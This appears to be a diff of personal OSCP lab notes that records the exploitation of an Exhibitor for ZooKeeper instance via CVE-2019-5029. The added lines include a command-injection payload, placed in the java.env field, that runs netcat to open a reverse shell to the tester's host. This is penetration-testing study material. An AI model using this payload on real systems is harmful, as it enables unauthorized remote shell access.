@@ -1,4 +1,4 @@
-IP::   192.168.113.98
+IP::   192.168.217.98
 
 | Machine | IP Address | Notes |
 | ------- | ---------- | ----- |
@@ -27,7 +27,7 @@ const command = `http://${ip}/`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-Discovered Web Domain::   EXAMPLECOM
+Discovered Web Domain::   192.168.113.98
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Notes");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
@@ -122,3 +122,16 @@ http://192.168.113.98:8080/exhibitor/v1/ui/index.html
 ```
 
 ```
+
+---
+
+visited http://192.168.217.98:8080/exhibitor/v1/ui/index.html and discovered exhibiter for zookeeper v1.
+
+CVE-2019-5029 https://www.exploit-db.com/exploits/48654
+
+$(/bin/nc -e /bin/sh 192.168.45.226 4444 &)  in java.env script field.
+
+received a reverse shell connection and local flag
+
+
+
